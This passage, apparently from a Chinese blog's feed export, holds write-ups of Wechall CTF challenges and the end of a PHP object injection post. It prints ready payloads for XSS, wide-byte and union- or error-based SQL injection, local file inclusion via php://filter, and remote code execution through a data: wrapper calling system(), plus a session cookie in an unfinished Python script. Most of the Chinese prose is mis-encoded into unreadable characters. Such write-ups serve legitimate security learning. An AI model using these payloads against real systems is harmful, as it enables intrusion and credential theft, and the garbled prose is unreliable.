</code></pre><p>å®šä¹‰äº†ä¸€ä¸ªtestç±»ç”Ÿæˆä¸€ä¸ªä¸´æ—¶æ–‡ä»¶å’Œä¸€ä¸ªuserç±»ï¼Œæœ€åæœ‰ä¸€ä¸ª â€œunserializeâ€ å€¼ï¼Œå®ƒçš„æœ¬æ„æ˜¯ä¼ é€’userçš„ä¿¡æ¯ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬è¾“å…¥ä¸€ä¸ªå­—ç¬¦ä¸²æœ€åèƒ½å¤Ÿè¢«ååºåˆ—åŒ–ä¸ºtestç±»ï¼Œé‚£ä¹ˆé—®é¢˜å°±å…³é”®äº†ï¼Œå› ä¸ºä¸€ä¸ªtestç±»æœ€åä¼šåˆ é™¤å®ƒçš„åŒåæ–‡ä»¶å¤¹ï¼Œå¦‚æœæ­¤æ—¶æˆ‘ä»¬é€šè¿‡å¦‚ä¸‹ä»£ç æ„é€ ä¸€ä¸²å­—ç¬¦ä¸²ï¼š</p>
<pre><code>&lt;?php
//include &apos;object_injection.php&apos;;
class test{}
$obj = new test();
$obj-&gt;filename = &apos;.htaccess&apos;;
echo serialize($obj) . &apos;&lt;br /&gt;&apos;;
?&gt;
</code></pre><p>è¿è¡Œç»“æœä¸ºï¼š</p>
<blockquote>
<p>O:4:â€testâ€:1:{s:8:â€filenameâ€;s:9:â€.htaccessâ€;}</p>
</blockquote>
<p>æ–°å»ºä¸€ä¸ª<code>.htaccess</code>çš„æ–‡ä»¶,ç„¶åå°†æ‰“å°å‡ºæ¥çš„ç»“æœä¼ å…¥åˆ°ä¹‹å‰é‚£ä¸ªphpä¸­ï¼Œé‚£ä¹ˆæœ€ç»ˆåˆ é™¤çš„å°±æ˜¯è¿™ä¸ªâ€™.htaccessâ€™æ–‡ä»¶äº†ã€‚å› ä¸ºè„šæœ¬ç»“æŸæ—¶ __destructä¼šè¢«è°ƒç”¨ï¼Œä»è€Œè§¦å‘åˆ é™¤ã€‚</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/%E5%BA%8F%E5%88%97%E5%8C%961-3.png" alt=""></p>
<p>è¿™å°±æ˜¯è¯¥æ¼æ´åå­—çš„ç”±æ¥ï¼šä½œä¸ºä¸€ä¸ªæ”»å‡»è€…ï¼Œä¸ºäº†å®ç°æ‰§è¡Œä½ çš„ä»£ç æˆ–è€…å¯¹ä½ æ¥è¯´å…¶ä»–æœªé¢„æ–™åˆ°çš„æœ‰ç”¨çš„è¡¨ç°ï¼Œä¸ä½¿ç”¨æœŸæœ›çš„åºåˆ—åŒ–çš„å¯¹è±¡ï¼Œè€Œæ˜¯æ³¨å…¥å…¶ä»–çš„PHPå¯¹è±¡ã€‚</p>
<h1 id="0x05-PHPå¯¹è±¡æ³¨å…¥é˜²å¾¡"><a href="#0x05-PHPå¯¹è±¡æ³¨å…¥é˜²å¾¡" class="headerlink" title="0x05 PHPå¯¹è±¡æ³¨å…¥é˜²å¾¡"></a>0x05 PHPå¯¹è±¡æ³¨å…¥é˜²å¾¡</h1><p>åœ¨å¤„ç†ç”±ç”¨æˆ·æä¾›æ•°æ®çš„åœ°æ–¹ä¸è¦ä½¿ç”¨â€œunserializeâ€ï¼Œä½ å¯ä»¥ä½¿ç”¨â€œjson_decodeâ€ã€‚</p>
]]></content>
      
        
        <tags>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> PHP </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Wechall CTF writeup2]]></title>
      <url>/2016/07/23/Webchall-CTF-writeup2/</url>
      <content type="html"><![CDATA[<h2 id="htmlspecialchars"><a href="#htmlspecialchars" class="headerlink" title="htmlspecialchars"></a>htmlspecialchars</h2><p>htmlspecialchars()ä¸åŠ å‚æ•°åªä¼šå°†åŒå¼•å·å®ä½“åŒ–ï¼Œè¿™é‡Œåªéœ€è¦å•å¼•å·å³å¯ã€‚<br><a id="more"></a></p>
<p>åœ¨æœ¬åœ°æ­å»ºç¯å¢ƒï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code>&lt;?php
if(isset($_GET[&apos;in&apos;]))
{
    $a=$_GET[&apos;in&apos;];
    echo &quot;&lt;a href=&apos;http://&quot;.htmlspecialchars($a).&quot;&apos;&gt;Exploit Me&lt;/a&gt;&quot;;
    echo htmlspecialchars(&quot;&lt;a href=&apos;http://&quot;.htmlspecialchars($a).&quot;&apos;&gt;Exploit Me&lt;/a&gt;&quot;);
}
?&gt;
</code></pre><p>è¾“å…¥ä»¥ä¸‹ä»£ç ï¼š</p>
<blockquote>
<p><a href="http://127.0.0.1:8080/xss/test.php?in=%27%20onmouseover=%27alert(1" target="_blank" rel="external">http://127.0.0.1:8080/xss/test.php?in=%27%20onmouseover=%27alert(1</a>)</p>
</blockquote>
<p>ç„¶åé¼ æ ‡è§¦å‘å³å¯å¼¹çª—ã€‚</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/webchall_htmlspecialchars.png" alt=""></p>
<h2 id="Connect-the-Dots"><a href="#Connect-the-Dots" class="headerlink" title="Connect the Dots"></a>Connect the Dots</h2><p>ç›²æ–‡å¯†ç </p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/wechall_Connect%20the%20Dots.jpg" alt=""></p>
<p>è§£å¯†ä¸ºï¼š<code>thesolutionis***</code></p>
<h2 id="Tracks"><a href="#Tracks" class="headerlink" title="Tracks"></a>Tracks</h2><p>ä¸»è¦åˆ†ä¸‰æ­¥ï¼š</p>
<pre><code>1.æ³¨å†Œ
2.æŠ•ç¥¨
3.è¯´å·²æŠ•è¿‡äº†
</code></pre><p>é€šè¿‡æ”¹å®ƒè¯·æ±‚çš„åœ°å€ï¼Œæ¥æ”¹å˜httpç¼“å­˜ã€‚ç¬¬äºŒæ­¥çš„æ—¶å€™å‘ç°å“åº”å¤´æœ‰ä¸ªEtagå­—æ®µï¼Œè¿™ä¸ªå’Œè¯·æ±‚å¤´é‡Œé¢çš„<code>If-None-Match</code>è¿›è¡ŒåŒ¹é…ã€‚</p>
<p><a href="http://www.iteye.com/topic/656658" target="_blank" rel="external">HTTPåè®®ç¼“å­˜ç­–ç•¥</a></p>
<p>ä¿®æ”¹è¯·æ±‚å¤´é‡Œçš„WCå­—æ®µå’ŒVOTEå­—æ®µå³å¯ã€‚</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/wechall_tracks.png" alt=""></p>
<h2 id="PHP-0818"><a href="#PHP-0818" class="headerlink" title="PHP 0818"></a>PHP 0818</h2><p>PHPå¼±ç±»å‹</p>
<p>é¦–å…ˆçœ‹ä¸€ä¸‹æºç ï¼š</p>
<pre><code>function noother_says_correct($number)
{
    $one = ord(&apos;1&apos;);
    $nine = ord(&apos;9&apos;);
    for ($i = 0; $i &lt; strlen($number); $i++)
    { 
        $digit = ord($number{$i});
        if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )
        {
            return false;
        }
    }
    return $number == &quot;3735929054&quot;;
}
</code></pre><p>ä¸»è¦çš„æ„æ€å°±æ˜¯ä¸èƒ½æ˜¯<code>1~9</code>çš„æ•°å­—ï¼Œä½†æ˜¯åˆè¦å’Œ<code>3735929054</code>ç›¸ç­‰ï¼Œæ˜æ˜¾æ˜¯PHPå¼±ç±»å‹ç”±äºæ˜¯==ï¼Œ</p>
<pre><code>===ä¼šæ¯”è¾ƒä¸¤ä¸ªå˜é‡çš„ç±»å‹ 
è€Œ==åªæ¯”è¾ƒä»–ä»¬çš„å€¼  
æ¯”å¦‚æ•´æ•°0å’Œæµ®ç‚¹æ•°0.0   
ç”¨==æ¯”è¾ƒè¿”å›TRUE   
ç”¨===æ¯”è¾ƒè¿”å›FLASE
</code></pre><p>3735929054çš„åå…­è¿›åˆ¶å³0xdeadc0de,0åˆåˆšå¥½ä¸åœ¨1-9é‡Œé¢ï¼Œç¬¦åˆã€‚</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/wechall_php0818.png" alt=""></p>
<h2 id="Addslashes"><a href="#Addslashes" class="headerlink" title="Addslashes"></a>Addslashes</h2><p>addslashes()å‡½æ•°çš„åŠŸèƒ½æ˜¯è¿”å›åœ¨é¢„å®šä¹‰å­—ç¬¦ä¹‹å‰æ·»åŠ åæ–œæ çš„å­—ç¬¦ä¸²ã€‚</p>
<p>ä¸»è¦çš„æºç å¦‚ä¸‹ï¼š</p>
<pre><code>&lt;?php
function asvsmysql_login($username, $password)
{
    $username = addslashes($username);
    $password = md5($password);
    ...
    $query = &quot;SELECT username FROM users WHERE username=&apos;$username&apos; AND password=&apos;$password&apos;&quot;;
    ...
    if ($result[&apos;username&apos;] !== &apos;Admin&apos;) {
        return htmlDisplayError(&apos;You are logged in, but not as Admin.&apos;);
    }

    return htmlDisplayMessage(&apos;You are logged in. congrats!&apos;);
}
?&gt;
</code></pre><p>addslashes()å‡½æ•°å­˜åœ¨å®½å­—èŠ‚æ³¨å…¥æ¼æ´ã€‚åŸå› æ˜¯%bf%27æœ¬èº«ä¸æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„GBKå­—ç¬¦ï¼Œä½†ç»è¿‡addslashes()è½¬æ¢åå˜ä¸º%bf%5c%27ï¼Œå‰é¢çš„%bf%5cæ˜¯ä¸ªæœ‰æ•ˆçš„GBKå­—ç¬¦ï¼Œæ‰€ä»¥%bf%5c%27å°±ä¼šå½“ä½œä¸€ä¸ªå­—ç¬¦åŠ ä¸€ä¸ªå•å¼•å·ï¼Œè¿™æ ·æ¼æ´å°±è§¦å‘äº†ã€‚mysql_real_escape_string()ä¹Ÿæ˜¯ä¸€æ ·ã€‚</p>
<p>è¾“å…¥</p>
<blockquote>
<p>%bf%27 union select Admin%23&amp;password=123</p>
</blockquote>
<p>æŠ¥é”™ï¼Œè¯´ä¸è¯†åˆ«è¿™äº”ä¸ªå­—æ¯ï¼Œç„¶åå°±æ˜¯æŠŠå­—æ¯è½¬æ¢æˆå­—ç¬¦</p>
<blockquote>
<p>%bf%27 union select CHAR(65,100,109,105,110)%23&amp;password=123</p>
</blockquote>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/wechall_Addslashes.png" alt=""></p>
<h2 id="The-Guestbook"><a href="#The-Guestbook" class="headerlink" title="The Guestbook"></a>The Guestbook</h2><p>æºç å¾ˆé•¿ï¼Œä¹Ÿæ²¡ä»”ç»†çœ‹ï¼Œé¦–å…ˆå°±æ˜¯å…ˆåšäº†ä¸€ä¸ªæ­£å¸¸çš„ç•™è¨€ï¼Œè¿”å›çš„ç»“æœå¦‚ä¸‹ï¼š</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/wechall_guestbook1.png" alt=""></p>
<p>ä»”ç»†çœ‹ï¼Œæˆ‘ä»¬å°±å¯ä»¥å‘ç°ä¸€ä¸ªè¹Šè··ï¼Œå°±æ˜¯è¿”å›ä¸€ä¸ªip:8.8.8.8è¿™æ˜¯æˆ‘ç«ç‹çš„ä¸€ä¸ªæ’ä»¶ï¼Œç„¶åæˆ‘å°±è¯•è¯•ï¼Œåœ¨é‡Œé¢æ’å…¥ä¸€äº›æ¶æ„ä»£ç :</p>
<pre><code>$query =
        &quot;CREATE TABLE IF NOT EXISTS gbook_user ( &quot;.
        &quot;gbu_id        INT(11)     UNSIGNED PRIMARY KEY, &quot;. # Guestbook userid
        &quot;gbu_name      VARCHAR(63) CHARACTER SET ASCII COLLATE ascii_general_ci, &quot;. # Guestbook username
        &quot;gbu_password  VARCHAR(255) CHARACTER SET ASCII COLLATE ascii_bin ) &quot;; # Guestbook password &lt;-- You need the password for username Admin
    $db-&gt;queryWrite($query);
</code></pre><p>ä¸Šé¢çš„ä»£ç çœ‹å‡ºè¡¨åæ˜¯ï¼š<code>gbook_user</code>ï¼Œå­—æ®µ:<code>gbu_password,gbu_name</code></p>
<p>æ ¹æ®GET ipçš„æŸ¥è¯¢è¯­å¥ï¼Œæ„é€ å¦‚ä¸‹ï¼š</p>
<blockquote>
<p>â€˜,(select gbu_password from gbook_user where gbu_name=â€™adminâ€™))#</p>
</blockquote>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/wechall_guestbook2.png" alt=""></p>
<h2 id="PHP-0816"><a href="#PHP-0816" class="headerlink" title="PHP 0816"></a>PHP 0816</h2><p>é¢˜ç›®è¦æ±‚æˆ‘ä»¬è¯»<code>solution.php</code>è¿™ä¸ªæ–‡ä»¶ã€‚</p>
<p>ä¸»è¦å°±æ˜¯å‡ ä¸ªå‚æ•°ï¼Œsrcï¼Œhlï¼Œmodeï¼Œå®ƒæ˜¯æŒ‰é¡ºåºè¯»å–å‚æ•°å€¼çš„ï¼Œ </p>
<pre><code>php0816SetSourceFileä¸»è¦æ˜¯è®¾ç½®æ˜¾ç¤ºæºç çš„æ–‡ä»¶åï¼Œæœ‰ä¸€ä¸ªç™½åå•è¿‡æ»¤ï¼Œå®ƒä¼šè¯»å–srcï¼Œ 
ç„¶åæ˜¯php0816executeæ‰§è¡Œç¨‹åºmode=hlï¼Œ 
ç„¶åå°±æ˜¯php0816addHighlightsï¼Œå®ƒè°ƒç”¨php0816Highlighterï¼Œè€Œè¿™ä¸ªå‡½æ•°ç›´æ¥æœ‰ä¸€ä¸ªgetGet(&apos;src&apos;)
æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥æ‰§è¡Œmode=hl&amp;src=solution.phpï¼Œï¼Œè¿™æ ·å°±æ²¡æœ‰è®¿é—®php0816SetSourceFileè¿™ä¸ªå‡½æ•°ã€‚ç›´æ¥è¯»å–äº†solution.php
</code></pre><p>POCï¼š</p>
<blockquote>
<p><a href="http://www.wechall.net/challenge/php0816/code.php?mode=hl&amp;src=solution.php" target="_blank" rel="external">http://www.wechall.net/challenge/php0816/code.php?mode=hl&amp;src=solution.php</a></p>
</blockquote>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/wechall_php0816.png" alt=""></p>
<h2 id="Table-Names"><a href="#Table-Names" class="headerlink" title="Table Names"></a>Table Names</h2><p>åœ¨usernameåŠ ä¸ªâ€™ æŠ¥é”™äº†ï¼Œå­˜åœ¨æ³¨å…¥ ï¼Œæ„é€ è¯­å¥ã€‚</p>
<pre><code>1&apos; order by 4#   æŠ¥é”™
1&apos; order by 3#    æ­£ç¡®
ä¸‰ä¸ªå­—æ®µ
1&apos; and 1=2 union select 1,2,3#
æ˜¾ç¤º3
1&apos; and 1=2 union select 1,2,database()#
æ•°æ®åº“åï¼šgizmore_tableu61
1&apos; and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x67697A6D6F72655F7461626C65753631#
ä¸¤ä¸ªè¡¨åï¼šaaawrong,usertableus4
</code></pre><p>TMD å¯¹äºç­”æ¡ˆä¹Ÿæ˜¯é†‰äº†,è¿˜å¾—è¿ä¸€å—ï¼š</p>
<blockquote>
<p>gizmore_tableu61_usertableus4</p>
</blockquote>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/wechall_table_names.png" alt=""></p>
<h2 id="Training-RegexMini"><a href="#Training-RegexMini" class="headerlink" title="Training: RegexMini"></a>Training: RegexMini</h2><p>æ­£åˆ™åŒ¹é…</p>
<p>æˆåŠŸçš„è¦æ±‚æ˜¯è¾“å…¥ä¸€ä¸ªé•¿åº¦ &gt; 16 ä½çš„ä¸€ä¸ªç”¨æˆ·åï¼Œå¹¶æˆåŠŸæ³¨å†Œã€‚</p>
<p>æ­£åˆ™è¡¨è¾¾å¼ä¸ºï¼š</p>
<blockquote>
<p><code>/^[a-zA-Z]{1,16}$/</code></p>
</blockquote>
<p>åœ¨ php çš„æ­£åˆ™é‡Œé¢ï¼Œ<code>^$</code>çš„æ„æ€æ˜¯åŒ¹é…å‰ä¸€ä¸ªæ¢è¡Œç¬¦ä¹‹åï¼Œä¸‹ä¸€ä¸ªæ¢è¡Œç¬¦ä¹‹å‰ï¼Œè¿™ä¸­é—´ä¸€æ®µçš„å­—ç¬¦ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬åªéœ€è¦è¾“å…¥16ä¸ªä»»æ„å¤§å°å†™å­—æ¯ï¼Œå†åŠ ä¸Šä¸€ä¸ªæ¢è¡Œç¬¦ï¼ˆ%0A) å°±å¯ä»¥äº†ã€‚</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/wechall_regexmini.png" alt=""></p>
<h2 id="Are-you-serial"><a href="#Are-you-serial" class="headerlink" title="Are you serial"></a>Are you serial</h2><p><a href="http://byd.dropsec.xyz/2016/07/24/PHP-Object-Injection/">PHPå¯¹è±¡æ³¨å…¥</a></p>
<h2 id="Yourself-PHP"><a href="#Yourself-PHP" class="headerlink" title="Yourself PHP"></a>Yourself PHP</h2><p>PHPçš„$_SERVER[â€˜PHP_SELFâ€™]é€ æˆçš„XSSæ¼æ´.</p>
<p>æµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code>&lt;?php
//require &apos;check.php&apos;;
if (isset($_POST[&apos;username&apos;])){
        echo sprintf(&quot;Well done %s, you entered your username. But this is not what you need to do.&quot;, htmlspecialchars($_POST[&apos;username&apos;]));
}
echo &apos;&lt;div class=&quot;box box_c&quot;&gt;&apos;.PHP_EOL;
echo sprintf(&apos;&lt;form action=&quot;%s&quot; method=&quot;post&quot;&gt;&apos;, $_SERVER[&apos;PHP_SELF&apos;]).PHP_EOL;
    echo sprintf(&apos;&lt;div&gt;Username:&lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;&quot; /&gt;&lt;/div&gt;&apos;).PHP_EOL;
echo sprintf(&apos;&lt;div&gt;&lt;input type=&quot;submit&quot; name=&quot;deadcode&quot; value=&quot;Submit&quot; /&gt;&lt;/div&gt;&apos;).PHP_EOL;
echo sprintf(&apos;&lt;/form&gt;&apos;).PHP_EOL;
echo &apos;&lt;/div&gt;&apos;.PHP_EOL;
?&gt;
</code></pre><p>æ„é€ POCï¼š</p>
<blockquote>
<p><code>http://127.0.0.1:8080/xss/test1.php/&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;</code></p>
</blockquote>
<p>æ•ˆæœå¦‚ä¸‹ï¼š</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/wechall_YourselfPHP.png" alt=""></p>
<h2 id="PHP-0819"><a href="#PHP-0819" class="headerlink" title="PHP 0819"></a>PHP 0819</h2><p><strong>PHP heredoc</strong></p>
<p>é¢˜çš„æ„æ€å°±æ˜¯è®©eval=â€™1337â€™,ä½†æ˜¯è¿‡æ»¤äº†å•å¼•å·ï¼Œä½¿ç”¨heredocä¾¿èƒ½ç»•è¿‡å¯¹äºå¼•å·çš„è¿‡æ»¤ï¼Œæ³¨å…¥æƒ³è¦çš„å­—ç¬¦ä¸²ã€‚</p>
<p>php ä¸­çš„ heredocæŠ€æœ¯æ˜¯phpç”¨æ¥å¼•ç”¨å­—ç¬¦ä¸²çš„ä¸€ç§æ–¹å¼ã€‚åœ¨phpwindä¸­å·§å¦™çš„è¿ç”¨äº†è¿™ä¸ªæŠ€æœ¯ï¼Œå®ç°äº†é€»è¾‘ä»£ç å’Œç•Œé¢è®¾è®¡çš„åˆ†ç¦»ã€‚</p>
<pre><code>è¯­æ³•ï¼š  

1. ä½¿ç”¨æ“ä½œç¬¦  â€œ&lt;&lt;&lt;â€

2. æ“ä½œç¬¦åç´§è·Ÿæ ‡è¯†ç¬¦ï¼ˆå¼€å§‹æ ‡è¯†ç¬¦ï¼‰ï¼Œä¹‹åé‡èµ·æ–°çš„ä¸€è¡Œ è¾“å…¥è¦å¼•ç”¨çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥åŒ…å«å˜é‡ã€‚

3. æ–°çš„ä¸€è¡Œï¼Œé¡¶æ ¼å†™ç»“æŸè¡¨ç¤ºç¬¦ï¼Œä»¥åˆ†å·ç»“æŸã€‚

è¦æ³¨æ„åˆ°å‡ ç‚¹ï¼š

1. æ ‡è¯†ç¬¦å¯ä»¥è‡ªå®šä¹‰ ä¸€èˆ¬çš„ æœ‰EOT ï¼ŒEOD  EOF ç­‰ï¼Œ åªè¦ä¿æŒå¼€å§‹è¡¨ç¤ºç¬¦å’Œç»“æŸè¡¨ç¤ºç¬¦ä¸€æ ·å³å¯ã€‚

2. ç»“æŸè¡¨ç¤ºç¬¦å¿…é¡»ç‹¬å ä¸€è¡Œï¼Œä¸”å¿…é¡»é¡¶æ ¼å†™ï¼Œæœ€åä»¥ â€˜;â€™ åˆ†å·ç»“å°¾ã€‚

3. æ‰€æœ‰å¼•ç”¨çš„å­—ç¬¦ä¸²ä¸­å¯ä»¥åŒ…å«å˜é‡ï¼Œæ— éœ€å­—ç¬¦ä¸²è¿æ¥ç¬¦ã€‚

ä¾‹å¦‚ï¼š
echo &lt;&lt;&lt;suibian
æ­£æ–‡
æ­£æ–‡
suibian;
// æ ¼å¼åº”è¯¥æ˜¯ &lt;&lt;&lt;+ä»»æ„å­—ç¬¦x+æ¢è¡Œ+å­—ç¬¦ä¸²+æ¢è¡Œ+ä»»æ„å­—ç¬¦x+;æ¢è¡Œ
</code></pre><p>æ„é€ POCï¼š</p>
<blockquote>
<p><a href="http://www.wechall.net/challenge/space/php0819/index.php?eval=" target="_blank" rel="external">http://www.wechall.net/challenge/space/php0819/index.php?eval=</a>&lt;&lt;&lt;s%0a1337%0as;%0a</p>
</blockquote>
<h2 id="MD5-SALT"><a href="#MD5-SALT" class="headerlink" title="MD5.SALT"></a>MD5.SALT</h2><p>ç®€å•çš„sqlæ³¨å…¥</p>
<p>æœ€åæ„é€ è¯­å¥ï¼š</p>
<blockquote>
<p>â€˜ and 1=2 union select password,2 from users where username=â€Adminâ€#</p>
</blockquote>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/wechall_MD5_salt.png" alt=""></p>
<h2 id="Order-By-Query"><a href="#Order-By-Query" class="headerlink" title="Order By Query"></a>Order By Query</h2><p>order by æ³¨å…¥ã€‚</p>
<p>1.å¯ä»¥ä½¿ç”¨andè¿›è¡ŒåŒé‡æŸ¥è¯¢</p>
<p><code>1 and (select count(*) from products group by concat(version(),0Ã—27202020,floor(rand(0)*2-1)))â€“</code></p>
<p>2.åœ¨desc/asc [å‚æ•°] ä¹‹åä½¿ç”¨åŒé‡æŸ¥è¯¢</p>
<p><code>1 desc,(select count(*) from users group by concat(version(),0x27202020,floor(rand(0)*2-1)))&#39;5.0.95-community&#39;</code></p>
<p>å…·ä½“çš„è¯·å‚ç…§ï¼š<a href="http://www.2cto.com/Article/201211/170433.html" target="_blank" rel="external">order by/limitä¹‹åæ³¨å…¥</a></p>
<p>å…³äºæŠ¥é”™æ³¨å…¥çš„ä¸€äº›è¯­æ³•è¯·å‚ç…§ï¼š<a href="http://www.waitalone.cn/mysql-error-based-injection.html" target="_blank" rel="external">æŠ¥é”™æ³¨å…¥æ–¹æ³•æ•´ç†</a></p>
<p>æ„é€ POCï¼š</p>
<blockquote>
<p><code>http://www.wechall.net/challenge/order_by_query/index.php?by=1 and ExtractValue(1,(select password from users where username=CHAR(65, 100, 109, 105, 110)))#</code></p>
</blockquote>
<p>å¾—åˆ°MD5ï¼š</p>
<blockquote>
<p>C3CBEB0C8ADC66F2922C65E7784BE14</p>
</blockquote>
<h2 id="Can-you-read-me"><a href="#Can-you-read-me" class="headerlink" title="Can you read me"></a>Can you read me</h2><p>tesseractè¿™ä¸ªè½¯ä»¶å¯ä»¥åšocr</p>
<h2 id="Crappyshare"><a href="#Crappyshare" class="headerlink" title="Crappyshare"></a>Crappyshare</h2><p>æ„é€ POC:</p>
<blockquote>
<p><a href="http://www.wechall.net/challenge/crappyshare/crappyshare.php?file://solution.php" target="_blank" rel="external">http://www.wechall.net/challenge/crappyshare/crappyshare.php?file://solution.php</a></p>
</blockquote>
<p>å½“æˆ‘ä»¬è¾“å…¥çš„file://å‚æ•°è¢«å¸¦å…¥curlä¸­æ‰§è¡Œæ—¶ï¼ŒåŸæœ¬çš„è¿œç¨‹URLè®¿é—®ä¼šè¢«é‡å®šå‘åˆ°æœ¬åœ°ç£ç›˜ä¸Šï¼Œä»è€Œè¾¾åˆ°è¶Šæƒè®¿é—®æ–‡ä»¶çš„ç›®çš„</p>
<p>æ¨èä¸€ç¯‡æ–‡ç« ï¼š<a href="http://www.cnblogs.com/littlehann/p/3665062.html" target="_blank" rel="external">LFIã€RFIã€PHPå°è£…åè®®å®‰å…¨é—®é¢˜å­¦ä¹ </a></p>
<h2 id="Warchall-Live-LFI"><a href="#Warchall-Live-LFI" class="headerlink" title="Warchall: Live LFI"></a>Warchall: Live LFI</h2><p>è¿›å»ä¹‹åå‘ç°å·¦ä¸Šè§’ï¼Œæœ‰ä¸ªæŒ‰é’®ï¼Œç›´æ”¹åé¢çš„å‚æ•°ä¸º<code>solution.php</code>,</p>
<p>POC1:<code>http://lfi.warchall.net/index.php?lang=solution.php</code></p>
<p>å›åº”å¦‚ä¸‹ï¼š</p>
<pre><code>teh falg si naer!

the flag is near!

PHP Warning(2): Illegal string offset &apos;welcome&apos; in index.php line 12

Backtrace starts in index.php line 12.
GWF_Debug::error_handler() core/inc/util/GWF_Debug.php line 183.
</code></pre><p>æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼Œä½¿ç”¨<code>php://filter/read</code>è¯»ä¸€ä¸‹solution.phpçš„æºç </p>
<p>POC2:</p>
<blockquote>
<p><a href="http://lfi.warchall.net/?lang=php://filter/read=convert.base64-encode/resource=solution.php" target="_blank" rel="external">http://lfi.warchall.net/?lang=php://filter/read=convert.base64-encode/resource=solution.php</a></p>
</blockquote>
<p>base64è§£å¯†ï¼š</p>
<pre><code>&lt;html&gt;
&lt;body&gt;
&lt;pre style=&quot;color:#000;&quot;&gt;teh falg si naer!&lt;/pre&gt;
&lt;pre style=&quot;color:#fff;&quot;&gt;the flag is near!&lt;/pre&gt;
&lt;/body&gt;
&lt;/html&gt;
&lt;?php                  #   YOUR_TROPHY 
return &apos;SteppinStones42Pie&apos;; # &lt;-Â´ ?&gt;
</code></pre><h2 id="Warchall-Live-RFI"><a href="#Warchall-Live-RFI" class="headerlink" title="Warchall: Live RFI"></a>Warchall: Live RFI</h2><p>èƒ½æŸ¥çœ‹é¡µé¢èƒ½å®¹çš„PHPä¼ªåè®®ï¼Œæˆ‘çŸ¥é“çš„åªæœ‰ä¸¤ç§ï¼š</p>
<pre><code>?file=data:text/plain,&lt;?php system(&quot;net user&quot;)?&gt;

?file=php://filter/read=convert.base64-encode/resource=index.php
</code></pre><p>æˆ‘ä½¿ç”¨filterè¯»åè®®å‡ºæ¥äº†ç«Ÿç„¶ï¼š</p>
<pre><code>PGh0bWw+Cjxib2R5Pgo8cHJlPk5PVEhJTkcgSEVSRT8/Pz88L3ByZT4KPC9ib2R5Pgo8L2h0bWw+CgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8P3BocCByZXR1cm4gJ0xvd19INE5HSU5HX0ZydWl0JzsgPz4K 
</code></pre><p>ä½†æ˜¯è§£å¯†å‘ç°ä¸å¯¹æœ‰ï¼Ÿï¼Ÿï¼Ÿï¼Œç„¶åæˆ‘å‘ç°base64é‡Œé¢æœ‰å¥½å¤šé‡å¤çš„ï¼Œç„¶åæˆ‘åˆ é™¤ç‚¹</p>
<pre><code>&lt;html&gt;
&lt;body&gt;
&lt;pre&gt;NOTHING HERE????&lt;/pre&gt;
&lt;/body&gt;
&lt;/html&gt;              &lt;?php return &apos;Low_H4NGING_Fruit&apos;; ?&gt;
</code></pre><p>å¥½å§ï¼Œï¼Œï¼Œ</p>
<p>è¯•äº†è¯•dataåè®®,ä¹Ÿå¯ä»¥ã€‚</p>
<blockquote>
<p><a href="http://rfi.warchall.net/index.php?lang=data:text/plain" target="_blank" rel="external">http://rfi.warchall.net/index.php?lang=data:text/plain</a>,&lt;?php system(â€œcat solution.phpâ€)?&gt;</p>
</blockquote>
<h2 id="Impossible-nâ€™est-pas-francais"><a href="#Impossible-nâ€™est-pas-francais" class="headerlink" title="Impossible nâ€™est pas franÃ§ais"></a>Impossible nâ€™est pas franÃ§ais</h2><p>åˆ†è§£ä¸€ä¸ªå¾ˆå¤§çš„æ•°çš„è´¨å› æ•°ã€‚éœ€è¦6s å†…æäº¤ </p>
<p>ä½†æ˜¯ï¼Œåªè¦æˆ‘ä»¬å°è¯•æäº¤ä¸€æ¬¡ä¹‹åï¼Œå°±å¯ä»¥å‘ç°å®ƒä¼šè¿”å›ä¸€ä¸ªæ­£ç¡®çš„è§£ã€‚</p>
<p>æ—¢ç„¶å¦‚æ­¤ï¼Œæˆ‘ä»¬åªè¦å…ˆæäº¤ä¸€æ¬¡ï¼Œç„¶åç¨‹åºè¯»å–å®ƒè¿”å›çš„æ­£ç¡®æ•°å­—ä¸²ï¼Œå†æäº¤å°±å¯ä»¥äº†ã€‚</p>
<p>pythonè„šæœ¬å¦‚ä¸‹ï¼š</p>
<pre><code>#!/usr/bin/env python
# coding=utf-8
import requests
import urllib2
import lxml
import lxml.html as H
from bs4 import BeautifulSoup

cookie = {
    &apos;WC&apos;: &apos;9038838-0-DGwGp7VNYefa6o7o&apos;
}
def get_number():
    number_url = &apos;http://www.wechall.net/challenge/impossible/index.php?request=new_number&apos;
    #opener = urllib2.build_opener()
    #opener.addheaders.append((&apos;Cookie&apos;,&apos;WC=9038838-0-DGwGp7VNYefa6o7o&apos;))
